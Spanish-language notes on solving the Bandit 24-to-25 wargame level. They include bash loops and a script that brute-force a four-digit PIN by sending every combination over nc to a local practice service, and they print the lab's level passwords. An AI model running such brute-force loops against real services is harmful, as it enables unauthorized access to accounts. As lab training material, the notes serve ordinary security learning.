Pass next level : iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

Fuerza bruta aplicada a conexiones

Nos dicen que se debe pasar el pass del user bandt24 y un pin de 4 digitos que no conocemos . 

Generamos un ficher con todas las combiaciones posible en una carpeta temporal 
```
 dir_name=$(mktemp -d)
 cd $dir_name
 
for i in {0000..9999};do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> combinaciones;done

Ahora intentamos pasar los parametros mediante le nc a la coneccion que suguiere el ejercicio.

cat combinaciones | nc localhost 30002 | grep -v "Wrong"

Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

grep -v "Wrong"  #Para que no nos muestre osas innecesarias
```

Script para ver la combinación correcta.

```
#!/bin/bash

pass=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

for pin in $(seq -w 0000 9999)
do
res=$(echo "$pass $pin" | nc -N 127.0.0.1 30002 | head -n 3 | grep -vP "(Wrong|Please)")
 if [[ $res != "" ]]
 then
  echo "the corret pin is $pin" & echo  "$res" | tail -n 1 
  break
 fi
done
```

En una linea fijar que cada que termina una sentencia de bash en una linea debmos poner ; para indicar que termino la sentencia y va a comenzar otra


```
for i in {0000..9999}; do res=$(echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" | nc -q 0 localhost 30002 | grep -vE "Wrong|Please"); if [[ $res != "" ]]; then echo "El codigo es $i"; break; fi; done
```